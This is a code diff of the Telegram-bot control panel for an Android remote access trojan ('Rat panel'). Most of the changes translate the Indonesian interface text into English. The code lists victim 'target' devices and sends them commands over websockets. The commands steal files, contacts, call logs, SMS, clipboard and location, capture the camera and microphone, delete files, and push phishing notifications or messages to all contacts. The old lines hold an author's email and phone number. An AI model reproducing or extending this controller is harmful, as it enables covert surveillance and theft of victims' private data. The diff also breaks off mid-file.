+                '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n' +
+                '• ᴡʜᴇɴ ᴛʜᴇ ᴠɪᴄᴛɪᴍ ᴄʟɪᴄᴋꜱ ᴏɴ ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ, ᴛʜᴇ ʟɪɴᴋ ʏᴏᴜ ᴀʀᴇ ᴇɴᴛᴇʀɪɴɢ ᴡɪʟʟ ʙᴇ ᴏᴘᴇɴᴇᴅ',
                 {reply_markup: {force_reply: true}}
             )
         }
-        if (message.reply_to_message.text.includes('°• 𝘽𝙖𝙞𝙠, 𝙨𝙚𝙠𝙖𝙧𝙖𝙣𝙜 𝙢𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙩𝙖𝙪𝙩𝙖𝙣...')) {
+        if (message.reply_to_message.text.includes('°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
             const link = message.text
             appSocket.clients.forEach(function each(ws) {
                 if (ws.uuid == currentUuid) {
@@ -281,19 +281,19 @@ appBot.on('message', (message) => {
             });
             currentUuid = ''
             appBot.sendMessage(id,
-                '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
-                '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
+                '°• Permintaan Anda sedang diproses\n\n' +
+                '• Anda akan menerima respons dalam beberapa saat',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
+                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                         'resize_keyboard': true
                     }
                 }
             )
         }
-///sini
-        if (message.reply_to_message.text.includes('°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙩𝙖𝙪𝙩𝙖𝙣 𝙖𝙪𝙙𝙞𝙤 𝙮𝙖𝙣𝙜 𝙞𝙣𝙜𝙞𝙣 𝙙𝙞𝙥𝙪𝙩𝙖𝙧')) {
+        ////sini
+        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮')) {
             const audioLink = message.text
             appSocket.clients.forEach(function each(ws) {
                 if (ws.uuid == currentUuid) {
@@ -302,12 +302,12 @@ appBot.on('message', (message) => {
             });
             currentUuid = ''
             appBot.sendMessage(id,
-                '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
-                '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
+                '°• Permintaan Anda sedang diproses\n\n' +
+                '• Anda akan menerima respons dalam beberapa saat',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
+                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                         'resize_keyboard': true
                     }
                 }
@@ -317,62 +317,61 @@ appBot.on('message', (message) => {
     if (id == chatId) {
         if (message.text == '/start') {
             appBot.sendMessage(id,
-                '°• 𝙎𝙚𝙡𝙖𝙢𝙖𝙩 𝙙𝙖𝙩𝙖𝙣𝙜 𝙙𝙞 𝙋𝙖𝙣𝙚𝙡 𝙍𝘼𝙏\n\n' +
-                '• ᴊɪᴋᴀ ᴀᴘʟɪᴋᴀꜱɪ ᴛᴇʟᴀʜ ᴛᴇʀᴘᴀꜱᴀɴɢ ᴅɪ ᴘᴇʀᴀɴɢᴋᴀᴛ ᴛᴀʀɢᴇᴛ, ᴛᴜɴɢɢᴜ ꜱᴀᴍᴘᴀɪ ᴛᴇʀʜᴜʙᴜɴ\n\n' +
-                '• ꜱᴀᴀᴛ ᴀɴᴅᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴘᴇꜱᴀɴ "ᴛᴇʀʜᴜʙᴜɴɢ", ʙᴇʀᴀʀᴛɪ ᴘᴇʀᴀɴɢᴋᴀᴛ ꜱᴜᴅᴀʜ ꜱɪᴀᴘ ᴍᴇɴᴇʀɪᴍᴀ ᴘᴇʀɪɴᴛᴀʜ\n\n' +
-                '• ᴋʟɪᴋ ᴛᴏᴍʙᴏʟ ᴘᴇʀɪɴᴛᴀʜ, ᴘɪʟɪʜ ᴘᴇʀᴀɴɢᴋᴀᴛ ʏᴀɴɢ ᴅɪɪɴɢɪɴᴋᴀɴ, ʟᴀʟᴜ ᴘɪʟɪʜ ᴘᴇʀɪɴᴛᴀʜ ᴅᴀʀɪ ᴅᴀꜰᴛᴀʀ ʏᴀɴɢ ᴀᴅᴀ\n\n' +
-                '• ᴊɪᴋᴀ ᴀɴᴅᴀ ᴛᴇʀᴊᴇʀᴀᴛ ᴅɪ ᴛᴇɴɢᴀʜ ʙᴏᴛ, ᴋɪʀɪᴍ ᴘᴇʀɪɴᴛᴀʜ /start ᴜɴᴛᴜᴋ ᴍᴜʟᴀɪ ᴅᴀʀɪ ᴜʟᴀɴɢ\n\n' +
-                '<b>• 𝙄𝙣𝙛𝙤 : choerullanam@gmail.com | 081318574216</b>',
+                '°• 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝙍𝙖𝙩 𝙥𝙖𝙣𝙚𝙡\n\n' +
+                '• ɪꜰ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ, ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ\n\n' +
+                '• ᴡʜᴇɴ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴍᴇꜱꜱᴀɢᴇ, ɪᴛ ᴍᴇᴀɴꜱ ᴛʜᴀᴛ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪꜱ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴀɴᴅ ʀᴇᴀᴅʏ ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ\n\n' +
+                '• ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ʙᴜᴛᴛᴏɴ ᴀɴᴅ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴅᴇᴠɪᴄᴇ ᴛʜᴇɴ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴄᴏᴍᴍᴀɴᴅ ᴀᴍᴏɴɢ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅꜱ\n\n' +
+                '• ɪꜰ ʏᴏᴜ ɢᴇᴛ ꜱᴛᴜᴄᴋ ꜱᴏᴍᴇᴡʜᴇʀᴇ ɪɴ ᴛʜᴇ ʙᴏᴛ, ꜱᴇɴᴅ /start ᴄᴏᴍᴍᴀɴᴅ',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
+                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                         'resize_keyboard': true
                     }
                 }
             )
         }
-if (message.text == '𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜') {
-    if (appClients.size == 0) {
-        appBot.sendMessage(id,
-            '°• 𝙏𝙞𝙙𝙖𝙠 𝙖𝙙𝙖 𝙥𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙮𝙖𝙣𝙜 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜\n\n' +
-            '• ᴘᴀꜱᴛɪᴋᴀɴ ᴀᴘʟɪᴋᴀꜱɪ ᴛᴇʟᴀʜ ᴅɪɪɴꜱᴛᴀʟ ᴅɪ ᴘᴇʀᴀɴɢᴋᴀᴛ ᴛᴀʀɢᴇᴛ'
-        )
+        if (message.text == '𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨') {
+            if (appClients.size == 0) {
+                appBot.sendMessage(id,
+                    '°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n' +
+                    '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
+                )
+            } else {
+                let text = '°• 𝙇𝙞𝙨𝙩 𝙤𝙛 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 :\n\n'
+                appClients.forEach(function (value, key, map) {
+                    text += `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${value.model}</b>\n` +
+                        `• ʙᴀᴛᴛᴇʀʏ : <b>${value.battery}</b>\n` +
+                        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${value.version}</b>\n` +
+                        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${value.brightness}</b>\n` +
+                        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${value.provider}</b>\n\n`
+                })
+                appBot.sendMessage(id, text, {parse_mode: "HTML"})
+            }
+        }
+        if (message.text == '𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙') {
+            if (appClients.size == 0) {
+                appBot.sendMessage(id,
+                    '°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n' +
+                    '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
+                )
+            } else {
+                const deviceListKeyboard = []
+                appClients.forEach(function (value, key, map) {
+                    deviceListKeyboard.push([{
+                        text: value.model,
+                        callback_data: 'device:' + key
+                    }])
+                })
+                appBot.sendMessage(id, '°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙙𝙚𝙫𝙞𝙘𝙚 𝙩𝙤 𝙚𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙚𝙣𝙙', {
+                    "reply_markup": {
+                        "inline_keyboard": deviceListKeyboard,
+                    },
+                })
+            }
+        }
     } else {
-        let text = '°• 𝘿𝙖𝙛𝙩𝙖𝙧 𝙥𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙮𝙖𝙣𝙜 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜 :\n\n'
-        appClients.forEach(function (value, key, map) {
-            text += `• ᴍᴏᴅᴇʟ : <b>${value.model}</b>\n` +
-                    `• ʙᴀᴛᴇʀᴀɪ : <b>${value.battery}</b>\n` +
-                    `• ᴠᴇʀꜱɪ ᴀɴᴅʀᴏɪᴅ : <b>${value.version}</b>\n` +
-                    `• ᴋᴇᴄᴇʀᴀʜᴀɴ ʟᴀʏᴀʀ : <b>${value.brightness}</b>\n` +
-                    `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${value.provider}</b>\n\n`
-        })
-        appBot.sendMessage(id, text, {parse_mode: "HTML"})
-    }
-}
-if (message.text == '𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝') {
-    if (appClients.size == 0) {
-        appBot.sendMessage(id,
-            '°• 𝙏𝙞𝙙𝙖𝙠 𝙖𝙙𝙖 𝙥𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙮𝙖𝙣𝙜 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜\n\n' +
-            '• ᴘᴀꜱᴛɪᴋᴀɴ ᴀᴘʟɪᴋᴀꜱɪ ᴛᴇʟᴀʜ ᴅɪɪɴꜱᴛᴀʟ ᴅɪ ᴘᴇʀᴀɴɢᴋᴀᴛ ᴛᴀʀɢᴇᴛ'
-        )
-    } else {
-        const deviceListKeyboard = []
-        appClients.forEach(function (value, key, map) {
-            deviceListKeyboard.push([{
-                text: value.model,
-                callback_data: 'device:' + key
-            }])
-        })
-        appBot.sendMessage(id, '°• 𝙋𝙞𝙡𝙞𝙝 𝙥𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙪𝙣𝙩𝙪𝙠 𝙙𝙞𝙗𝙚𝙧𝙞 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝', {
-            "reply_markup": {
-                "inline_keyboard": deviceListKeyboard,
-            },
-        })
-    }
-}
-    } else {
-        appBot.sendMessage(id, '°• 𝘼𝙠𝙨𝙚𝙨 𝙙𝙞𝙩𝙤𝙡𝙖𝙠')
+        appBot.sendMessage(id, '°• 𝙋𝙚𝙧𝙢𝙞𝙨𝙨𝙞𝙤𝙣 𝙙𝙚𝙣𝙞𝙚𝙙')
     }
 })
 appBot.on("callback_query", (callbackQuery) => {
@@ -382,51 +381,51 @@ appBot.on("callback_query", (callbackQuery) => {
     const uuid = data.split(':')[1]
     console.log(uuid)
     if (commend == 'device') {
-        appBot.editMessageText(`°• 𝙋𝙞𝙡𝙞𝙝 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝 𝙪𝙣𝙩𝙪𝙠 𝙥𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
+        appBot.editMessageText(`°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙘𝙤𝙢𝙢𝙚𝙣𝙙 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
             width: 10000,
             chat_id: id,
             message_id: msg.message_id,
-            "reply_markup": {
+            reply_markup: {
                 inline_keyboard: [
                     [
-                        {text: '𝘼𝙥𝙡𝙞𝙠𝙖𝙨𝙞', callback_data: `apps:${uuid}`},
-                        {text: '𝙄𝙣𝙛𝙤 𝙥𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩', callback_data: `device_info:${uuid}`}
+                        {text: '𝘼𝙥𝙥𝙨', callback_data: `apps:${uuid}`},
+                        {text: '𝘿𝙚𝙫𝙞𝙘𝙚 𝙞𝙣𝙛𝙤', callback_data: `device_info:${uuid}`}
                     ],
                     [
-                        {text: '𝘼𝙢𝙗𝙞𝙡 𝙛𝙞𝙡𝙚', callback_data: `file:${uuid}`},
-                        {text: '𝙃𝙖𝙥𝙪𝙨 𝙛𝙞𝙡𝙚', callback_data: `delete_file:${uuid}`}
+                        {text: '𝙂𝙚𝙩 𝙛𝙞𝙡𝙚', callback_data: `file:${uuid}`},
+                        {text: '𝘿𝙚𝙡𝙚𝙩𝙚 𝙛𝙞𝙡𝙚', callback_data: `delete_file:${uuid}`}
                     ],
                     [
                         {text: '𝘾𝙡𝙞𝙥𝙗𝙤𝙖𝙧𝙙', callback_data: `clipboard:${uuid}`},
-                        {text: '𝙈𝙞𝙠𝙧𝙤𝙛𝙤𝙣', callback_data: `microphone:${uuid}`},
+                        {text: '𝙈𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚', callback_data: `microphone:${uuid}`},
                     ],
                     [
-                        {text: '𝙆𝙖𝙢𝙚𝙧𝙖 𝙪𝙩𝙖𝙢𝙖', callback_data: `camera_main:${uuid}`},
-                        {text: '𝙆𝙖𝙢𝙚𝙧𝙖 𝙨𝙚𝙡𝙛𝙞𝙚', callback_data: `camera_selfie:${uuid}`}
+                        {text: '𝙈𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖', callback_data: `camera_main:${uuid}`},
+                        {text: '𝙎𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖', callback_data: `camera_selfie:${uuid}`}
                     ],
                     [
-                        {text: '𝙇𝙤𝙠𝙖𝙨𝙞', callback_data: `location:${uuid}`},
-                        {text: '𝙋𝙚𝙨𝙖𝙣 𝙩𝙖𝙢𝙥𝙞𝙡', callback_data: `toast:${uuid}`}
+                        {text: '𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣', callback_data: `location:${uuid}`},
+                        {text: '𝙏𝙤𝙖𝙨𝙩', callback_data: `toast:${uuid}`}
                     ],
                     [
-                        {text: '𝙋𝙖𝙣𝙜𝙜𝙞𝙡𝙖𝙣', callback_data: `calls:${uuid}`},
-                        {text: '𝘽𝙪𝙠𝙪 𝙖𝙡𝙖𝙢𝙖𝙩', callback_data: `contacts:${uuid}`}
+                        {text: '𝘾𝙖𝙡𝙡𝙨', callback_data: `calls:${uuid}`},
+                        {text: '𝘾𝙤𝙣𝙩𝙖𝙘𝙩𝙨', callback_data: `contacts:${uuid}`}
                     ],
                     [
-                        {text: '𝙑𝙞𝙗𝙧𝙖𝙨𝙞', callback_data: `vibrate:${uuid}`},
-                        {text: '𝙏𝙖𝙢𝙥𝙞𝙡𝙠𝙖𝙣 𝙣𝙤𝙩𝙞𝙛𝙞𝙠𝙖𝙨𝙞', callback_data: `show_notification:${uuid}`}
+                        {text: '𝙑𝙞𝙗𝙧𝙖𝙩𝙚', callback_data: `vibrate:${uuid}`},
+                        {text: '𝙎𝙝𝙤𝙬 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣', callback_data: `show_notification:${uuid}`}
                     ],
                     [
-                        {text: '𝙋𝙚𝙨𝙖𝙣', callback_data: `messages:${uuid}`},
-                        {text: '𝙆𝙞𝙧𝙞𝙢 𝙥𝙚𝙨𝙖𝙣', callback_data: `send_message:${uuid}`}
+                        {text: '𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨', callback_data: `messages:${uuid}`},
+                        {text: '𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚', callback_data: `send_message:${uuid}`}
                     ],
                     [
-                        {text: '𝙋𝙪𝙩𝙖𝙧 𝙖𝙪𝙙𝙞𝙤', callback_data: `play_audio:${uuid}`},
-                        {text: '𝙃𝙚𝙣𝙩𝙞𝙠𝙖𝙣 𝙖𝙪𝙙𝙞𝙤', callback_data: `stop_audio:${uuid}`},
+                        {text: '𝙋𝙡𝙖𝙮 𝙖𝙪𝙙𝙞𝙤', callback_data: `play_audio:${uuid}`},
+                        {text: '𝙎𝙩𝙤𝙥 𝙖𝙪𝙙𝙞𝙤', callback_data: `stop_audio:${uuid}`},
                     ],
                     [
                         {
-                            text: '𝙆𝙞𝙧𝙞𝙢 𝙥𝙚𝙨𝙖𝙣 𝙠𝙚 𝙨𝙚𝙢𝙪𝙖 𝙠𝙤𝙣𝙩𝙖𝙠',
+                            text: '𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨',
                             callback_data: `send_message_to_all:${uuid}`
                         }
                     ],
@@ -435,301 +434,285 @@ appBot.on("callback_query", (callbackQuery) => {
             parse_mode: "HTML"
         })
     }
-if (commend == 'calls') {
-    appSocket.clients.forEach(function each(ws) {
-        if (ws.uuid == uuid) {
-            ws.send('calls');
-        }
-    });
-    appBot.deleteMessage(id, msg.message_id)
-    appBot.sendMessage(id,
-        '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
-        '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
-        {
-            parse_mode: "HTML",
-            "reply_markup": {
-                "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
-                'resize_keyboard': true
+    if (commend == 'calls') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('calls');
             }
-        }
-    )
-}
-
-if (commend == 'contacts') {
-    appSocket.clients.forEach(function each(ws) {
-        if (ws.uuid == uuid) {
-            ws.send('contacts');
-        }
-    });
-    appBot.deleteMessage(id, msg.message_id)
-    appBot.sendMessage(id,
-        '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
-        '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
-        {
-            parse_mode: "HTML",
-            "reply_markup": {
-                "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
-                'resize_keyboard': true
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• Permintaan Anda sedang diproses\n\n' +
+            '• Anda akan menerima respons dalam beberapa saat',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+                    'resize_keyboard': true
+                }
             }
-        }
-    )
-}
-if (commend == 'messages') {
-    appSocket.clients.forEach(function each(ws) {
-        if (ws.uuid == uuid) {
-            ws.send('messages');
-        }
-    });
-    appBot.deleteMessage(id, msg.message_id)
-    appBot.sendMessage(id,
-        '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
-        '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
-        {
-            parse_mode: "HTML",
-            "reply_markup": {
-                "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
-                'resize_keyboard': true
+        )
+    }
+    if (commend == 'contacts') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('contacts');
             }
-        }
-    )
-}
-
-if (commend == 'apps') {
-    appSocket.clients.forEach(function each(ws) {
-        if (ws.uuid == uuid) {
-            ws.send('apps');
-        }
-    });
-    appBot.deleteMessage(id, msg.message_id)
-    appBot.sendMessage(id,
-        '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
-        '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
-        {
-            parse_mode: "HTML",
-            "reply_markup": {
-                "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
-                'resize_keyboard': true
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• Permintaan Anda sedang diproses\n\n' +
+            '• Anda akan menerima respons dalam beberapa saat',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+                    'resize_keyboard': true
+                }
             }
-        }
-    )
-}
-
-if (commend == 'device_info') {
-    appSocket.clients.forEach(function each(ws) {
-        if (ws.uuid == uuid) {
-            ws.send('device_info');
-        }
-    });
-    appBot.deleteMessage(id, msg.message_id)
-    appBot.sendMessage(id,
-        '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
